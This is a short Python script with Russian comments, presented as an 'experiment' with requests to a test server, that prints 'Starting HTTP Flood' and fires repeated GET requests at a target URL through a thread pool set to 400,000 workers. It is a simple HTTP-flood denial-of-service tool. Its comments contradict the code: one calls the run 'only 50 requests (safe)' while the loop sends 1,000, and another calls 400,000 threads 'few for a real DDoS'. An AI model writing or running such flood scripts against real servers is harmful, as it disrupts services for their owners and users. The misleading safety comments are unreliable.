# Эксперимент с серией HTTP-запросов к тестовому серверу.
import requests
import time
from concurrent.futures import ThreadPoolExecutor

def send_request(url):
    try:
        response = requests.get(url, timeout=3)
        print(f"[+] Sent request | Status: {response.status_code}")
    except:
        print("[!] Target unreachable")

url = "http://example.com"  # Меняй на свой тестовый сервер
threads = 400000  # "Потоки" (на самом деле их мало для реального DDoS)

print("Starting HTTP Flood ...")
with ThreadPoolExecutor(max_workers=threads) as executor:
    for _ in range(1000):  # Всего 50 запросов (безопасно)
        executor.submit(send_request, url)
        print("sent")
        time.sleep(0.1)  # Задержка, чтобы не перегружать
